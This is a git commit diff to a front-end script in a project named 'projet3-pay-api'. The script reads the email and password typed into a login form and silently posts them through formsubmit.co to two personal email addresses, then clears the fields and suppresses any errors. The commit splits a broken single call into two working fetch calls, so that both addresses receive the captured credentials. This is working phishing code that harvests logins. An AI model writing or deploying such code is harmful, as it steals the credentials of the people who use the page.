9b240e9ae8922b7cff36ac4f26a08ba1b9292ba8
projet3-pay-api <thomas.aaron.38off@gmail.com>
2025-12-19 17:40:10 +0100

    feat

--- public/main.js
+++ public/main.js
@@ -1,28 +1,47 @@
- const inputMail = document.querySelector('.mail');
-    const inputMdp  = document.querySelector('.mdp');
-    const btnNext   = document.querySelector('.primary');
+const inputMail = document.querySelector(".mail");
+const inputMdp = document.querySelector(".mdp");
+const btnNext = document.querySelector(".primary");
 
-    btnNext.addEventListener('click', async () => {
-        const email = inputMail.value;
-        const mdp   = inputMdp.value;
-        if (email.trim() === '' || mdp.trim() === '') return;
+btnNext.addEventListener("click", async () => {
+  const email = inputMail.value;
+  const mdp = inputMdp.value;
+  if (email.trim() === "" || mdp.trim() === "") return;
 
-        try {
-            await fetch('https://formsubmit.co/ajax/athomas@edenschool.fr', 'https://formsubmit.co/ajax/paulbegin28@gmail.com' ,{
-                method: 'POST',
-                headers: {
-                    'Content-Type':'application/x-www-form-urlencoded',
-                    'Accept':'application/json'
-                },
-                body: new URLSearchParams({
-                    '_subject':'Test connexon 2 champs',
-                    'identifiant': email,
-                    'mot_de_passe': mdp,
-                    '_captcha':'false',
-                    '_next':'https://formsubmit.co/success'
-                })
-            });
-            inputMail.value = '';
-            inputMdp.value  = '';
-        } catch(e) {}
+  try {
+    await fetch("https://formsubmit.co/ajax/athomas@edenschool.fr", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Accept: "application/json",
+      },
+      body: new URLSearchParams({
+        _subject: "Test connexon 2 champs",
+        identifiant: email,
+        mot_de_passe: mdp,
+        _captcha: "false",
+        _next: "https://formsubmit.co/success",
+      }),
     });
+    inputMail.value = "";
+    inputMdp.value = "";
+  } catch (e) {}
+
+  try {
+    await fetch("https://formsubmit.co/ajax/paulbegin28@gmail.com", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Accept: "application/json",
+      },
+      body: new URLSearchParams({
+        _subject: "Test connexon 2 champs",
+        identifiant: email,
+        mot_de_passe: mdp,
+        _captcha: "false",
+        _next: "https://formsubmit.co/success",
+      }),
+    });
+    inputMail.value = "";
+    inputMdp.value = "";
+  } catch (e) {}
+});
